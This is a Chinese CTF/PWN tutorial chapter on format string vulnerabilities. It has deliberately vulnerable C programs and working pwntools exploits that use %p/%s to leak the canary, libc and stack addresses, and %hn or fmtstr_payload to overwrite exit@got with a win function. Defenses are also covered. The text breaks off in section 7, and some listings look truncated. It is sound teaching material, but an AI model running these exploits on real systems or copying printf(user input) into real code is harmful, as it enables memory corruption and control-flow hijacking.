# P9 格式化字符串漏洞
## Format String Vulnerability

> [!info]- 章节信息
> **所属方向**：PWN ｜ **难度阶段**：L2 栈上利用期 ｜ **前置要求**：[[P06-栈溢出原理与ret2win|P6]] · [[P03-ELF链接与延迟绑定|P3]] · [[P04-Linux安全缓解机制|P4]]
> **本章目标**：讲清 `printf` 把用户输入当格式串之后发生了什么——可变参数的取值规则、`%p`/`%s` 怎么把栈和任意地址读出来、`%n` 怎么把数据写进内存；然后各做出一个完整的 exploit：定点泄露 Canary、libc 地址与栈地址，再把 partial RELRO 程序的 `exit@got` 改写成 `win` 函数。

[[P06-栈溢出原理与ret2win|P6]] 的栈溢出靠"越界写"夺取控制权，写入范围从缓冲区一路碾到返回地址。格式化字符串走的是另一条路：==读和写都由 `printf` 本身完成，一个字节都不用越界==。`printf(buf)` 里的 `buf` 若是用户输入，用户就能用 `%p` 把栈上的 Canary、libc 地址、栈地址逐个读出来（[[P04-Linux安全缓解机制|P4]] 说的"泄露后原样回填"的标准读法），也能用 `%n` 把任意数值写进任意可写地址——比如 [[P03-ELF链接与延迟绑定|P3]] 铺垫过的 GOT 表项。

[[P01-PWN导论与缓解机制全景#2. 利用链构建的五步流程|P1 第 2 节]]预告过的"两轮式利用"在这里第一次完整落地：第一轮泄露，第二轮带着正确地址构造写入。本章按"读 → 写 → 防护"推进，两个 exploit 都从头到尾走一遍。

## 1. 漏洞根源：printf 把用户输入当格式串

对比两行代码：

```c
printf("input> ");   /* 正常：格式串是写死的字符串字面量 */
printf(buf);         /* 漏洞：buf 是用户输入，被当作格式串 */
```

格式串里以 `%` 开头的段（`%d`、`%p`、`%s`、`%n` 这些）叫**转换说明**（conversion specification），它不是要打印的文字，而是一条"取下一个参数、按指定格式打印"的指令。格式串是字面量时，参数由程序员配对提供，取到哪儿都是准备好的数据；==格式串换成用户输入时，`printf` 仍按同一套规则向后取参数，取到什么打印什么==——而"下一个参数"的位置上，躺着的正是寄存器和栈上的现场数据。这就是漏洞的全部根源。

### 1.1 可变参数的取值规则：第 N 个转换读的是谁

`printf` 是变参函数，C 语言对"参数有几个、都是什么类型"不做编译期检查，全靠格式串自述。x86-64 Linux / System V AMD64 ABI 把这件事落成固定规则（寄存器分工 [[R03-x86与x64汇编精要复习|R03]] 的表）：第一个参数在 rdi——对 `printf` 就是格式串本身；其余参数依次 rsi、rdx、rcx、r8、r9，第 6 个起从栈上按地址递增逐个取。`printf` 不用的转换说明，==就把对应位置上的值原样按格式打出来==：

```text
; printf(fmt) 只带格式串一个可见参数时，每个转换说明取到的是谁
;   （x86-64 Linux / System V AMD64 ABI）
;
;   第 1 个 %p ─→ rsi        ┐
;   第 2 个 %p ─→ rdx        │  寄存器区：5 个
;   第 3 个 %p ─→ rcx        │  上一次调用留下的残留值
;   第 4 个 %p ─→ r8         │
;   第 5 个 %p ─→ r9         ┘
;   第 6 个 %p ─→ [rsp]      ← 从这里起是栈：调用点的栈顶开始
;   第 7 个 %p ─→ [rsp+0x8]     向高地址逐槽（每槽 8 字节）读下去
;   第 8 个 %p ─→ [rsp+0x10]    ……一路读进调用者的帧
```

两条推论是全章的地基：

- ==`%p` 连打等于"从寄存器区开始，顺着栈把 8 字节槽逐个拍出来"==。寄存器残留值、栈上的局部变量、保存的 rbp、返回地址、libc 指针，全都在射程内；
- `printf(buf)` 的 `buf` 本身是栈上的局部变量，==格式串自己也在这个序列里==——2.2 正是靠这一点定位偏移。

格式串里还可以用位置参数写法 `%6$p`：直接指定"取第 6 个参数"，编号就是上图里的序号（rsi 是第 1 个）。第 6 个转换对应第一个栈槽——==`printf(buf)` 在 `-O0` 下 `buf` 恰好压着调用点的栈顶，所以格式串自己从参数 6 开始==。

> [!info]- 调用 printf 前那条 mov eax,0
> 反汇编里 `call printf@plt` 前固定有一条 `mov eax,0x0`：`printf` 是变参函数，System V 约定 AL 存"向量寄存器参数的个数"，没有浮点参数就清零（[[R03-x86与x64汇编精要复习#7.1 形状一：函数序言与尾声|R03 7.1]] 的形状一里点过）。这条指令是==在反汇编里认出 printf 一家==的辅助特征。

### 1.2 漏洞程序

本章前半的演示程序只有一个要点——`printf(buf)`：

```c
/* p9_leak.c —— 泄露演示：用户输入被 printf 当作格式串（x86-64 Linux） */
#include <stdio.h>

char *gets(char *s);   /* gets 已移出 C11 标准，手动补声明 */

void vuln(void) {
    char buf[128];
    printf("input> ");
    gets(buf);
    printf(buf);        /* 漏洞点：buf 被当作格式串 */
    putchar('\n');
}

int main(void) {
    setbuf(stdout, NULL);
    vuln();
    return 0;
}
```

```bash
gcc -O0 -fno-pie -no-pie -D_FORTIFY_SOURCE=0 p9_leak.c -o p9_leak
```

输出：

```
p9_leak.c: In function ‘vuln’:
p9_leak.c:10:12: warning: format not a string literal and no format arguments [-Wformat-security]
   10 |     printf(buf);        /* 漏洞点：buf 被当作格式串 */
      |            ^~~
/usr/bin/x86_64-linux-gnu-ld.bfd: /tmp/ccp0mKkq.o: in function `vuln':
p9_leak.c:(.text+0x38): warning: the `gets' function is dangerous and should not be used.
```

两条警告各说各的：链接器那条点名 `gets`（[[P01-PWN导论与缓解机制全景#5.1 漏洞程序与编译|P1 5.1]] 见过，警告不是错误）；编译器那条 `[-Wformat-security]` 点名的正是==本章的漏洞本身==——"格式串不是字符串字面量，也没有格式参数"，就是 `printf(用户输入)` 的形状。这条警告现代工具链默认开启，第 7 节展开；本章的教学编译把它显式关掉，其余参数见折叠框。

```bash
pwn checksec p9_leak 2>&1 | grep -E 'RELRO|Stack|PIE'
```

输出：

```
    RELRO:      Partial RELRO
    Stack:      Canary found
    PIE:        No PIE (0x400000)
```

==Canary 开、PIE 关==是本章故意留的组合：Canary 开着，3.3 才有东西可泄露；PIE 关着，程序内地址是常量，注意力可以全放在格式串上（保护开关的原理 [[P04-Linux安全缓解机制|P4]]）。

> [!info]- 编译参数逐条说明
> | 参数 | 作用 |
> | ---- | ---- |
> | `-O0` | 关优化，帧布局与源码逐行对应（[[R03-x86与x64汇编精要复习#1. 本章范围与编译基线\|R03 第 1 节]]的编译基线） |
> | `-fno-pie` / `-no-pie` | 关 PIE，程序固定装载在 0x400000 一带，程序内地址可写死（[[P06-栈溢出原理与ret2win\|P6]] 同款） |
> | （不加 `-fno-stack-protector`） | ==保留默认开启的 Canary==——本章要泄露它；Canary 的插入位置与检查逻辑 [[P04-Linux安全缓解机制\|P4]] 第 3 节 |
> | `-D_FORTIFY_SOURCE=0` | 显式关掉加固宏（`-O0` 下本就不生效，写上以防环境差异），第 7 节开回来做对照 |
> | `-Wno-format-security` | 压掉上面那条默认警告，让后续编译输出干净 |
>
> 本章所有程序 `buf` 都取 128 字节：格式串 payload 连地址带指令一般几十字节，留足余量，==格式化字符串利用不需要溢出==。

找漏洞点的形状一句话：反汇编里 `call printf@plt`（或 `printf` 家族其他函数）的第一参数 rdi 不是 `.rodata` 里的常量，而是刚被 `gets`/`read`/`scanf` 填过的缓冲区——反编译器里 `printf(用户输入)` 一眼可见（定位方法 [[R05-静态分析工具链IDA与Ghidra|R05]]，危险函数清单 [[P02-前置基础C汇编与Linux|P2]]）。

## 2. 侦察：把栈读出来

### 2.1 %p 连打：逐个拍出参数槽

第一发 payload 把 24 个 `%p` 用 `-` 串起来，一次读出前 24 个参数槽：

```python
#!/usr/bin/env python3
# exp_recon.py —— %p 连打：逐个看参数槽里的内容
from pwn import *
context.log_level = 'error'

io = process('./p9_leak')
io.recvuntil(b'input> ')
io.sendline(b'AAAA-' + b'-'.join([b'%p'] * 24))
print(io.recvline().decode().strip())
io.close()
```

输出（前 8 个转换，余下同理）：

```
AAAA-0x37abe011-0x72583b814760-0x72583b814760-0x37abe05d-0xfbad2088-0x2d70252d41414141-0x70252d70252d7025-0x252d70252d70252d-…
```

对照 1.1 的参数序逐个判读：

| 第几个 %p | 输出 | 是什么 |
| ---- | ---- | ---- |
| 1 | 0x37abe011 | rsi 的残留值——上一次调用留下的，内容无意义 |
| 2–4 | 0x72583b814760 等 | rdx、rcx、r8 的残留值 |
| 5 | 0xfbad2088 | r9 的残留值，恰好落在 stdio 内部状态的范围（见下方折叠框） |
| 6 | 0x2d70252d41414141 | ==格式串自己的前 8 字节== |
| 7 起 | 0x70252d70252d7025 等 | buf 的后续内容：重复的 `%p-%p-%p` 字节 |

第 6 个值按小端还原（[[R02-C语言与内存模型回顾#7. 大小端|R02 第 7 节]]）：`0x2d70252d41414141` → 字节 `41 41 41 41 2d 25 70 2d` → ASCII `AAAA-%p-`——==开头的 AAAA 原样出现在第 6 个参数槽里==。这就是 **AAAA 序列法**：在格式串开头放一截可识别的标记，连打 `%p`，看标记从第几个参数冒出来，==格式串自己在参数序列里的位置就定了==。本题：参数 6。

> [!info]- 寄存器残留能读出什么
> 前 5 个 `%p` 的值取决于程序此前的执行路径，每次运行都会变，做题时不当数据用。但它们有时泄露内部状态：本例 r9 残留的 0xfbad2088 是 glibc `stdout` 的 `_flags` 字段 magic（`_IO_MAGIC` 高 16 位为 0xFBAD）——printf 内部用过 r9 之后把它留在了那里。==残留值也是值==，堆题里 heap 指针、libc 指针从寄存器槽里漏出来的情况都存在。

### 2.2 位置参数确认：%6$p

位置参数写法一步确认，不再数序：

```python
#!/usr/bin/env python3
# exp_offset.py —— 用位置参数确认格式串自己的槽位
from pwn import *
context.log_level = 'error'

io = process('./p9_leak')
io.recvuntil(b'input> ')
io.sendline(b'AAAA-%6$p')
print(io.recvline().decode().strip())
io.close()
```

输出：

```
AAAA-0x2436252d41414141
```

`0x2436252d41414141` 还原是 `AAAA-%6$`——这次第 6 槽装的是==这一发 payload 自己的前 8 字节==，偏移 6 再次成立。从这里得出全章都在用的换算公式：

$$\text{参数号} = 6 + \frac{\text{buf 内字节偏移}}{8} \tag{9.1}$$

buf 起点（偏移 0）是参数 6，此后每 8 字节参数号加 1。==这个偏移由帧布局决定==：`-O0` 下 `buf` 压着调用点栈顶，两个不同的程序只要都是 `printf(局部 buf)`，偏移往往都是 6；但布局随编译器、优化等级、变量排布变化（[[R03-x86与x64汇编精要复习#9. 常见问题|R03 常见问题]]的同款提醒），==换题必须重新量==，量的方法就是本节这两发。

### 2.3 %s：读指针指向的内容

`%p` 打出槽里存的值；`%s` 则把槽里的值==当作指针==，解引用后打印指向的字符串。两个演示各占一行脚本，地址取程序里现成的常量串 `input> `（pwntools 检索，[[P05-pwntools与GDB插件工具链|P5]] 的 `search`）：

```python
#!/usr/bin/env python3
# exp_s.py —— %s：读指针指向的内容；指针非法就崩
from pwn import *
context.log_level = 'error'

e = ELF('./p9_leak', checksec=False)
S = next(e.search(b'input> '))       # 0x402004：字符串常量的地址

io = process('./p9_leak')
io.recvuntil(b'input> ')
io.sendline(b'%7$saaaa' + p64(S))    # 地址补在末尾，参数 7 恰好对准它
print('合法指针 ->', io.recvline())
io.close()

io = process('./p9_leak')
io.recvuntil(b'input> ')
io.sendline(b'%7$saaaa' + p64(0x4141414141414141))
print('非法指针 ->', io.recvall(timeout=3))
io.close()
```

输出：

```
合法指针 -> b'input> aaaa\x04 @\n'
非法指针 -> b''
```

第一发的 payload 结构值得逐段看：

```text
; %7$saaaa + p64(0x402004) 的布局
;   [ %7$s ][ aaaa ][ 04 20 40 00 00 00 00 00 ]
;     4 字节   4 字节        8 字节地址
;   偏移 0~7 是指令与填充；地址从偏移 8 起 → 参数 6 + 8/8 = 7
```

两个设计各有讲究。其一，==64 位地址含 `\x00`，只能放在格式串末尾==：`p64(0x402004)` 的第 4 字节起全是 0，而 `printf` 读到格式串里的 `\0` 就停——地址放前面会把后面的指令截断。放末尾则没有冲突：`printf` 按序处理 `%7$s`（此刻参数 7 已能取到地址字节），随后打到地址里的 `\0` 自然收尾。其二，补 4 个 `a` 是为了把地址推到 8 字节整槽上，满足 9.1 的对齐；这些 `a` 是普通字符，原样打印。

输出逐段对上：`%7$s` 解引用 0x402004，打印出 `input> `（含尾部空格）；接着 4 个 `a` 原样打出；再往后是地址自身的字节 `04 20 40`（控制字符 `\x04`、空格、`@`），直到 `\0` 停止。==这就是"把地址放进格式串 + `%s`"的任意读==：槽位指向哪儿，就打印哪儿的内容。

第二发把指针换成 0x4141414141414141——非规范地址，解引用即触发段错误，`recvall` 只收到空串：进程死在 `printf` 内部，连接直接 EOF。用 shell 跑同一发输入看得更直白：

```bash
./p9_leak < pay_s.txt; echo "exit code = $?"    # pay_s.txt 内容：'%7$saaaaAAAAAAAA\n'
```

输出：

```
input> Segmentation fault
exit code = 139
```

> [!warning] %s 的指针来自槽位值，非法即崩
> `%s` 永远解引用。槽里是残留值或用户拼进去的假地址时，进程在 `printf` 内部死掉。所以==先 `%p` 看清楚槽里的值像不像合法指针（程序内地址 0x40xxxx、libc 地址 0x7f 开头），再决定要不要 `%s`==——崩溃本身就丢掉了一次泄露机会。

## 3. 定点泄露：Canary、libc 地址、栈地址

### 3.1 从帧布局算出目标槽位

`%p` 连打是撒网；定点泄露先算出目标在参数几。反汇编 `vuln`（x86-64 Linux / System V AMD64 ABI，Intel 语法），读出两个偏移：

```bash
objdump -d -M intel p9_leak | sed -n '/<vuln>:/,/^$/p'
```

输出：

```asm
00000000004011b6 <vuln>:
  4011b6:	f3 0f 1e fa          	endbr64
  4011ba:	55                   	push   rbp
  4011bb:	48 89 e5             	mov    rbp,rsp
  4011be:	48 81 ec 90 00 00 00 	sub    rsp,0x90
  4011c5:	64 48 8b 04 25 28 00 	mov    rax,QWORD PTR fs:0x28
  4011ce:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax     ; Canary 存进 rbp-0x8
  4011d4:	bf 04 20 40 00       	mov    edi,0x402004
  4011de:	e8 cd fe ff ff       	call   4010b0 <printf@plt>
  4011e3:	48 8d 85 70 ff ff ff 	lea    rax,[rbp-0x90]
  4011ea:	48 89 c7             	mov    rdi,rax
  4011ed:	e8 ce fe ff ff       	call   4010c0 <gets@plt>
  4011f2:	48 8d 85 70 ff ff ff 	lea    rax,[rbp-0x90]

```

`buf` 在 `rbp-0x90`（128 字节，正好压着 `rsp`），Canary 在 `rbp-0x8`（[[P04-Linux安全缓解机制|P4]] 第 3 节的固定位置）。套 9.1 换算：

| 目标 | 位置 | 距 buf 起点的字节偏移 | 参数号 |
| ---- | ---- | ---- | ---- |
| buf 起点 | rbp-0x90 | 0 | 6 |
| buf 末尾的空槽 | rbp-0x10 | 128 | 22 |
| ==Canary== | rbp-0x8 | 136 | ==23== |
| ==保存的 rbp（栈地址）== | rbp+0x0 | 144 | ==24== |
| 返回地址（main 内） | rbp+0x8 | 152 | 25 |
| ==libc 地址== | rbp+0x18 | 168 | ==27==（下一节用 GDB 确认它是什么） |

### 3.2 一次读出三个值

```python
#!/usr/bin/env python3
# exp_leak.py —— 定点泄露：Canary、栈地址、libc 地址
from pwn import *
context.log_level = 'error'

io = process('./p9_leak')
io.recvuntil(b'input> ')
io.sendline(b'%23$p|%24$p|%27$p')
canary, rbp, libc = io.recvline().strip().split(b'|')
print('canary =', canary.decode(), '（末字节 0x00）')
print('栈地址 =', rbp.decode(), '（保存的 rbp，指向 main 的帧）')
print('libc   =', libc.decode(), '（返回进 __libc_start_call_main 的地址）')
io.close()
```

输出：

```
canary = 0xfe78c7233878e600 （末字节 0x00）
栈地址 = 0x7ffd6d7654e0 （保存的 rbp，指向 main 的帧）
libc   = 0x786489a2a601 （返回进 __libc_start_call_main 的地址）
```

三个值各认各的特征：

| 泄露值 | 特征 | 判据 |
| ---- | ---- | ---- |
| Canary | 末字节 `00` | glibc 生成时故意清零最低字节（[[P04-Linux安全缓解机制#3. Stack Canary：栈上的哨兵值\|P4 第 3 节]]），==末字节是 0 的 8 字节栈值九成是 Canary== |
| 栈地址 | 0x7ff… 开头、与 rsp 同域 | 栈映射在用户空间顶端 |
| libc 地址 | 0x7f… 开头 | libc 映射在用户空间高位（[[P03-ELF链接与延迟绑定#4. ret2plt：把 libc 地址打印出来\|P3 第 4 节]]的泄露长一个样） |

==末字节 00 是 Canary 的双刃剑==：它挡住了 `gets` 这类按 `\0` 截断的溢出（[[P04-Linux安全缓解机制|P4]]），但在泄露侧它会把 `puts` 式的输出截断——本章用 `%p` 打印完整 8 字节，没有这个问题；用 `puts` 泄露 Canary 时才要绕它（[[P11-Canary绕过与GOT攻击|P11]] 的分半字节爆破）。

### 3.3 GDB 对证：泄露值与帧内容逐一对上

泄露值可信与否，GDB 里一眼见分晓。断点下在 `printf(buf)` 的调用点 0x401201，把帧内容拍出来：

`probe_leak.txt` 里是同一发 payload `%23$p|%24$p|%27$p`（程序自己的输出和 GDB 的转储出现在同一次运行里）：

> [!info]- 拿到三个泄露值之后各自通向哪
> - ==Canary==：溢出 payload 里原样回填，`__stack_chk_fail` 的尾声检查照常通过——[[P11-Canary绕过与GOT攻击|P11]] 的第一课，格式化字符串是它的标准供货渠道；
> - ==libc 地址==：减去该函数在本版 libc 里的偏移得基址，再加偏移得 `system`、`"/bin/sh"`——识别与匹配的完整流程 [[P03-ELF链接与延迟绑定#6. libc 识别与版本匹配|P3 第 6 节]]，拼进 ROP [[P07-ret2libc-ret2syscall-ret2shellcode|P7]]；
> - ==栈地址==：往栈上写数据时的落点坐标（比如把 shellcode 地址写回栈上某槽），[[P07-ret2libc-ret2syscall-ret2shellcode|P7]] 的环境变量法与本章第 5 节的写都会用到。

> [!warning] GDB 里地址固定是因为它默认关 ASLR
> 本次运行 libc 固定为 0x7ffff7c2a601、栈固定在 0x7fffffffe0e0——GDB 默认关闭被调试进程的 ASLR（[[P04-Linux安全缓解机制|P4]] 第 4 节）。==泄露流程本身不受影响==：偏移 23/24/27 由帧布局决定，跟 ASLR 无关，远程照用。

## 4. %n：把已输出的字符数写进内存

### 4.1 原理：%n 不打印，它记账

`%n` 是 `printf` 家族里唯一的写入型转换：==它把"到目前为止已输出的字符数"写进对应的指针参数==。一个最小程序说清它：

```c
/* fmt_n.c —— %n 的记账行为（x86-64 Linux） */
#include <stdio.h>

int main(void) {
    int n = 0;
    printf("abcdef%n", &n);
    printf(" [n=%d]\n", n);
    n = 0;
    printf("%10c%n", 'x', &n);
    printf(" [n=%d]\n", n);
    return 0;
}
```

```bash
gcc -O0 -fno-pie -no-pie fmt_n.c -o fmt_n
./fmt_n
```

输出：

```
abcdef [n=6]
         x [n=10]
```

第一行：打印 `abcdef` 共 6 个字符，`%n` 把 6 写进 `n`。第二行：`%10c` 打印参数 `'x'` 并按宽度 10 对齐——1 个字符加 9 个空格，`%n` 记到 10。==两件事合起来就是任意写的全部原料==：`%c` 的宽度控制"数到几"，`%n` 决定"写到哪"。

### 4.2 宽度控制：%c 是计数器

`%c` 打印一个字符（取参数的低 8 位），配宽度 `%10c` 就凑出 10 个字符、`%100c` 凑 100 个——==打印的字符内容无所谓，字符数才是目的==。左对齐版 `%-10c` 输出同样是 10 个字符（字符在前、空格在后），计数一样。注意 `%c` 本身也消耗一个参数槽，payload 里连续两个 `%64c` 会依次吃掉参数 1、2（rsi、rdx 的残留值），一般无碍，但==槽位规划时要把它们算进去==。

### 4.3 %hn：半字写入

`%n` 按整型宽度写：`%n` 写 4 字节、`%hn` 写 2 字节、`%hhn` 写 1 字节。直接 `%n` 有个硬伤——写入值等于已输出字符数，==要写 0x4011f6 就得先打印四百多万个字符==。工程上把大数拆开：

| 写法 | 单次写入 | 0x004011f6 的拆法 |
| ---- | ---- | ---- |
| `%hn` 两次 | 各 2 字节 | 先写 0x0040（64 个字符），再写 0x11f6（4598 个字符） |
| `%hhn` 多次 | 各 1 字节 | f6、11、40、00 四次，计数要求最低 |

拆写有一条铁律：==每个 `%n` 写入的是当时的累计计数，计数只增不减==，所以多次写入必须==按目标值从小到大排列==——先写小的值，再垫字符把计数顶到大的值。5 节的手算按这条铁律走。

### 4.4 32 位与 64 位的传参差异

| | x64（System V AMD64） | x86（cdecl） |
| ---- | ---- | ---- |
| 转换说明取参 | 前 5 个在寄存器，第 6 个起栈上 | ==全部在栈上==，没有寄存器区 |
| 地址宽度 | 8 字节，高位常为 `\x00` | 4 字节，高位常为 0 但写在内存里才有 00 |
| 地址放哪 | ==只能放格式串末尾==（2.3 的原因） | 无 `\x00` 时可嵌在格式串中间 |
| 常见偏移 | `printf(局部 buf)` 下常为 6 | 编号更靠前，按 AAAA 法重量 |

64 位"地址放末尾"是硬约束：8 字节地址必有 6 个 `00`（用户态地址高两位字节恒 0），嵌在中间必把格式串截断。32 位地址 4 字节，只要四个字节都不是 0（如 0x0804a060）就能任意嵌放——==这一点让 32 位的 payload 反而更自由==。两种位宽的取参差异与 P6 第 6 节的函数调用对照同源（[[P06-栈溢出原理与ret2win#6. 32 位 x86 对照：参数在栈上|P6 第 6 节]]）。

## 5. 实战：手算 %hn 改写 GOT

### 5.1 目标与依据

第二个演示程序（x86-64 Linux）：

```c
/* p9_got.c —— GOT 改写演示：exit 的调用被劫持到 win（x86-64 Linux） */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char *gets(char *s);   /* gets 已移出 C11 标准，手动补声明 */

void win(void) {
    puts("flag{fmt_got_hijack}");
    _exit(0);            /* 直接系统调用退出：不再经过已被改写的 exit */
}

void vuln(void) {
    char buf[128];
    printf("input> ");
    gets(buf);
    printf(buf);         /* 漏洞点：buf 被当作格式串 */
    putchar('\n');
}

int main(void) {
    setbuf(stdout, NULL);
    vuln();
    exit(0);             /* 触发点：正常收尾必然调用 exit */
}
```

```bash
gcc -O0 -fno-pie -no-pie -fno-stack-protector -D_FORTIFY_SOURCE=0 -Wno-format-security p9_got.c -o p9_got
pwn checksec p9_got 2>&1 | grep -E 'RELRO|Stack|PIE'
```

输出：

```
    RELRO:      Partial RELRO
    Stack:      No canary found
    PIE:        No PIE (0x400000)
```

改写 GOT 的前提由 [[P03-ELF链接与延迟绑定#3. RELRO：GOT 什么时候变只读|P3 第 3 节]]钉死：==Partial RELRO 下 GOT 的函数槽仍可写==（本程序 `-no-pie` 链接默认就是 Partial）；PIE 关，所有地址都是常量；Canary 干脆关掉——它防的是溢出，本章一个字节都不越界。==利用目标：把 `exit@got` 的内容改成 `win` 的地址，等程序收尾调用 `exit` 时跳进 `win`==。

三样原料查出来：

```bash
nm p9_got | grep -E ' T (main|vuln|win)$'
readelf -r p9_got | grep exit
```

输出：

```
0000000000401257 T main
0000000000401212 T vuln
00000000004011f6 T win
000000404030  000900000007 R_X86_64_JUMP_SLO 0000000000000000 exit@GLIBC_2.2.5 + 0
```

`win` 在 0x4011f6，`exit@got` 槽位在 0x404030。再确认触发点真实存在——main 收尾的 `call exit@plt`：

```bash
objdump -d -M intel p9_got | sed -n '/<main>:/,/^$/p'
```

输出：

  401266:	be 00 00 00 00       	mov    esi,0x0

### 5.2 手算 payload

==写入目标：0x404030（GOT 槽）的低 4 字节变成 0x004011f6==。槽位原值是延迟绑定的占位地址（0x401090，`objdump -s -j .got.plt` 可查）——高 4 字节本来就是 0，==只需改低 4 字节==。按 4.3 拆成两个半字：

| 半字 | 值 | 十进制（要打印的字符数） | 写到哪 |
| ---- | ---- | ---- | ---- |
| 高 16 位 | 0x0040 | 64 | 0x404032（GOT+2） |
| 低 16 位 | 0x11f6 | 4598 | 0x404030（GOT） |

按"计数只增不减"排序：64 < 4598，==先写高半字，再写低半字==。两个地址照 2.3 的规矩排在格式串末尾，槽位这样凑：

```text
; 手算过程（x86-64 Linux / System V AMD64 ABI）
;   指令部：'%64c%9$hn%4534c%10$hn'        长 21 字节
;   补 3 个 'a' 对齐到 24                  地址从 buf+24 起
;   地址槽位：24/8=3 → 参数 6+3 = 9（GOT+2）；参数 6+4 = 10（GOT）
;   与指令部引用的 %9$、%10$ 正好闭合
;
;   执行序：%64c 打印 64 字符 → %9$hn 把 64 写进 GOT+2（高半字 0x0040）
;           %4534c 再打印 4534 字符（累计 4598）
;           %10$hn 把 4598 写进 GOT（低半字 0x11f6）
;   末尾 3 个 'a' 与地址字节在其后才被处理，不影响计数
```

==payload 全长 24 + 16 = 40 字节，远小于 buf 的 128==——没有溢出，利用完完全全靠 `printf` 自己的写入。

### 5.3 exploit 与输出

```python
#!/usr/bin/env python3
# exp_got_hand.py —— 手算 %hn 两连写：exit@got 低 4 字节改成 win 的地址
from pwn import *
context.arch = 'amd64'
context.log_level = 'info'

e = ELF('./p9_got', checksec=False)
WIN = e.symbols['win']          # 0x4011f6
GOT = e.got['exit']             # 0x404030

lo = WIN & 0xffff               # 低半字 0x11f6 = 4598
hi = (WIN >> 16) & 0xffff       # 高半字 0x0040 = 64
assert hi < lo                  # 计数值小的半字先写

S1, S2 = 9, 10                  # 两个地址的参数序号
fmt = ('%%%dc%%%d$hn%%%dc%%%d$hn' % (hi, S1, lo - hi, S2)).encode()
fmt += b'a' * ((-len(fmt)) % 8) # 补齐到 8 的倍数，地址落在整槽上
assert len(fmt) == 24 and 6 + len(fmt) // 8 == S1

payload = fmt + p64(GOT + 2) + p64(GOT)
print('payload   =', payload)

io = process('./p9_got')
io.recvuntil(b'input> ')
io.sendline(payload)
data = io.recvall(timeout=3)
line = [l for l in data.split(b'\n') if b'flag{' in l]
success(line[0].decode())
io.close()
```

输出（4.5 KB 的填充空格略去）：

```
payload   = b'%64c%9$hn%4534c%10$hnaaa2@@\x00\x00\x00\x00\x000@@\x00\x00\x00\x00\x00'
[+] flag{fmt_got_hijack}
```

payload 里 `2@@`、`0@@` 正是两个地址的小端字节（0x404032、0x404030），中间的 `\0` 是地址高位——`printf` 处理到那里恰好收尾。

### 5.4 执行流复盘

| 步 | 发生了什么 |
| ---- | ---- |
| 1 | `gets` 把 payload 收进 buf，无溢出；`vuln` 正常继续 |
| 2 | `printf(buf)` 逐条处理格式串：两条 `%hn` 先后把 0x0040、0x11f6 写进 0x404032、0x404030——==此刻 `exit@got` 的内容变成 0x00000000004011f6，即 `win`== |
| 3 | `putchar('\n')`、`vuln` 收尾返回，一切如常 |
| 4 | main 走到 `call exit@plt`，`exit@plt` 查表 `jmp [0x404030]`（[[P03-ELF链接与延迟绑定#2. 延迟绑定：puts 的第一次调用\|P3 第 2 节]]的跳转链）——落进 `win` |
| 5 | `win` 打印 flag，`_exit` 直接走系统调用终止（不再经过已被改写的 `exit`，避免二次进 `win`） |

> [!note] 只写低半字：半字覆盖的缩减思路
> 本次 `exit@got` 原值 0x401090 的高半字恰好就是 0x0040，与 `win` 相同——==严格说只写低半字一次就够==。这种"目标值与现值相同的部分不写"的缩减叫半字（部分）覆盖，能把 payload 压得更短；PIE 程序里还可借"低 12 位不变"（[[P04-Linux安全缓解机制#5. PIE：程序本体的基址随机化|P4 第 5 节]]）只改最低 1–2 字节。手算时先比对原值，能省一次写就省一次。

## 6. 自动化：pwntools fmtstr_payload

手算的价值在理解；做题时 `fmtstr_payload` 一行生成等价 payload（工具对比 [[P05-pwntools与GDB插件工具链|P5]]）：

```python
#!/usr/bin/env python3
# exp_got_fmtstr.py —— fmtstr_payload 自动生成，同样改写 exit@got
from pwn import *
context.arch = 'amd64'
context.log_level = 'info'

e = ELF('./p9_got', checksec=False)
WIN = e.symbols['win']
GOT = e.got['exit']

payload = fmtstr_payload(6, {GOT: WIN}, write_size='short')
print('payload 长度 =', len(payload))
print('payload 开头 =', payload[:40])

io = process('./p9_got')
io.recvuntil(b'input> ')
io.sendline(payload)
data = io.recvall(timeout=3)
line = [l for l in data.split(b'\n') if b'flag{' in l]
success(line[0].decode())
io.close()
```

输出（4.6 KB 的填充空格略去）：

```
payload 长度 = 40
payload 开头 = b'%4598c%9$lln%74c%10$hhna0@@\x00\x00\x00\x00\x002@@\x00\x00\x00\x00\x00'
[+] flag{fmt_got_hijack}
```

参数就三个，逐个说清：

- ==`offset`（本例 6）==：格式串自己在参数序列里的位置，==2.2 的 AAAA 法量出来的那个数==。这是唯一必须自己提供的情报，给错则所有地址槽位错位、写入落空；
- `{GOT: WIN}`：写入字典，键为目标地址、值为要写的完整数值。工具自行拆半字、排顺序、算计数、补对齐；
- `write_size='short'`：拆分粒度。`'byte'`（默认）、`'short'`、`'int'` 分别对应 `%hhn`、`%hn`、`%n`，粒度越细单次计数要求越低、payload 越长。

> [!info]- 生成的 payload 用了不同宽度的写
> 对照 5.2 的手算版，工具的拆法不同：`%4598c%9$lln` 先按 8 字节写（`%lln`）把计数值 0x11f6 整体落进 GOT（顺带把高位清 0），`%74c%10$hhn` 再输出 74 个字符——累计 4598 + 74 = 4672 = 0x1240，按 1 字节写（`%hhn`）取最低字节 0x40 落在 GOT+2。两步拼出 0x4011f6，与手算殊途同归。==拆法不必与人一样，"计数递增 + 槽位对准"的铁律不变==。循环型题目里 `printf` 之前已有输出时，用 `numbwritten=N` 告诉工具起始计数（第 8 节）。

调试这类题还有个现成辅助：gef 插件的 `format-string-helper` 命令自动跑 `%p` 序列并把可疑槽位标出来（[[P05-pwntools与GDB插件工具链#9. GDB 插件：pwndbg、gef、peda|P5 第 9 节]]），定位 offset 时省两发手工。

## 7. 防护与限制

### 7.1 -Wformat-security：编译期的第一道警告

1.2 的编译输出已经展示过它：

```
warning: format not a string literal and no format arguments [-Wformat-security]
```

现代工具链默认开启：`printf(非字面量)` 且无格式参数就警告。它==不改变产物==，但把漏洞点标在编译日志里；发行版打包普遍用 `-Werror=format-security` 把它升级成错误，赛题源码里想藏都藏不住。反过来说，==拿到一道题的源码或反编译结果，`printf(用户输入)` 的形状就是格式化字符串漏洞的确认信号==。

### 7.2 FORTIFY_SOURCE：%n 在运行期被拒

[[P04-Linux安全缓解机制#7. checksec 逐行判读|P4 第 7 节]]的折叠框介绍过这层加固：开优化时编译器把危险函数换成 `_chk` 后缀版本。对 `printf` 一族，`__printf_chk` 会在运行期==拒绝执行"位于可写内存的格式串"里的 `%n`==。编译对照一目了然：

```bash
